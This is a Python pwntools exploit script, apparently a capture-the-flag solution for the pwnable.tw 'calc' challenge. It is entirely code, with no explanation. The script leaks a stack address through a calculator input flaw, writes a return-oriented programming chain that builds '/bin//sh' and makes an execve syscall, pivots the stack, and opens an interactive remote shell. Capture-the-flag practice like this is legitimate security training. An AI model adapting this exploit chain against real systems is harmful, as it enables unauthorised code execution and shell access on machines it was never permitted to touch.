from pwn import *
#io = process('./calc')
io = remote('chall.pwnable.tw', 10100)
pause()

ropchain = [0x080701aa, 0x080ec060, 0x0805c34b, int('nib/'.encode('hex'), 16), 
        0x0809b30d, 0x080701aa, 0x080ec064, 0x0805c34b, int('hs//'.encode('hex'), 16),
        0x0809b30d, 0x080701aa, 0x080ec068, 0x080550d0, 0x0809b30d, 0x080481d1,
        0x080ec060, 0x080701d1, 0x080ec068, 0x080ec060, 0x080701aa, 0x080ec068,
        0x080550d0, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f,
        0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f, 0x0807cb7f,
        0x08049a21]

io.recvuntil("=== Welcome to SECPROG calculator ===")
#write the ropchain after 8

def leak_stack():
    io.sendline('00%00' * 8)
    io.recvuntil('\n')
    stack = 0x100000000 + int(io.recvuntil('\n')[:-1])
    return stack

stack_addr = leak_stack()

def insert_rop(idx, num):
    payload = '00%00' * idx
    payload += str(num)
    io.sendline(payload)
    return 

def add_rops():
    for i in range(0, len(ropchain)):
        insert_rop(164 - i, ropchain[i])

add_rops()

ppr = 0x804cfe8
pop_eax_ret = 0x0805c34b
xor_eax_ret = 0x0804ddb7
xchg_eax_esp_ret = 0x804b8f4
bufferaddr = stack_addr - 1052 - 1036

insert_rop(6, pop_eax_ret)
insert_rop(5, bufferaddr ^ 0x83080bfd)
insert_rop(4, xor_eax_ret)
insert_rop(3, xchg_eax_esp_ret)
pause()
insert_rop(9, ppr)




io.interactive()
